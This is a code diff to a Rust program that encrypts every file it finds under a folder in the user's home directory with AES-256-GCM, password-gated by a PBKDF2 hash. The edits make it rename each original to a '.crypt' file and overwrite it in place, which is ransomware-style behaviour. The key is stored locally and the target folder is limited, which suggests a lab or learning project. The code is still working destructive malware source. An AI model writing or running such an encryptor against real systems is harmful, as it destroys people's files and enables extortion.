@@ -15,7 +15,7 @@ use pbkdf2::{
 };
 
 fn main() {
-    // Password hash
+    // Store password hash
     const STORED_HASH: &str = "$pbkdf2-sha256$i=600000,l=32$xnmJ40GIbyd8qnPS40c/5g$W3u+OKQtzpZIabIWQpcBKGFUNqPC9B9JCWeBmXQVfN0";
 
     // Parse command line arguments
@@ -27,7 +27,7 @@ fn main() {
         process::exit(1);
     }
 
-    // Parsed hash
+    // Verify parsed passsword hash
     let parsed_hash = PasswordHash::new(STORED_HASH).unwrap();
     if Pbkdf2
         .verify_password(args[1].as_bytes(), &parsed_hash)
@@ -43,10 +43,13 @@ fn main() {
     } else {
         env::var_os("HOME").map(PathBuf::from)
     }
-    .expect(":: [-] :: Home directory");
+    .unwrap_or_else(|| {
+        eprintln!(":: [-] :: Could not determine home directory");
+        std::process::exit(1);
+    });
 
-    // Append `target/` to avoid encrypting HOME
-    path.push("target");
+    // Append `.home/` to avoid encrypting `HOME`
+    path.push(".home");
 
     // Discover files
     let files = discover_files(&path).unwrap_or_else(|err| {
@@ -54,19 +57,18 @@ fn main() {
         process::exit(1);
     });
 
-    // Encryption key - generate random
+    // Generate random encryption key
     let key = Aes256Gcm::generate_key(OsRng);
-    println!(":: [i] :: Encryption key :: {:?}", &key);
 
-    // Encryption key - save to a file
+    // Save encryption key to a file
     let key_file = Path::new("encryption.key");
-    let mut file = File::create(key_file).expect(":: [-] :: Failed to create file");
-    file.write_all(&key)
-        .expect(":: [-] :: Failed to write to file");
+    fs::write(key_file, key).unwrap();
+
+    println!(":: [i] :: Encryption key file :: {:?}", &key_file);
 
     // Iterate over files
     for file in files {
-        // Read file content
+        // Read file contents
         let content_res = fs::read(&file);
         let content = match content_res {
             Ok(res) => res,
@@ -90,12 +92,18 @@ fn main() {
         let mut out_path = file.clone();
         out_path.set_extension("crypt");
 
-        let mut file = File::create(out_path).expect(":: [-] :: Creating file");
+        // Rename original file
+        fs::rename(&file, &out_path).expect(":: [-] :: Rename original file");
+
+        // Overwrite renamed file
+        let mut file = File::create(&out_path).expect(":: [-] :: Create file");
 
         // Write `nonce` and `ciphertext` to file
         file.write_all(&nonce_bytes).expect(":: [-] :: Write nonce");
         file.write_all(&ciphertext)
             .expect(":: [-] :: Write ciphertext");
+
+        println!(":: [+] :: Encrypted file :: {:?}", &out_path);
     }
 }
 
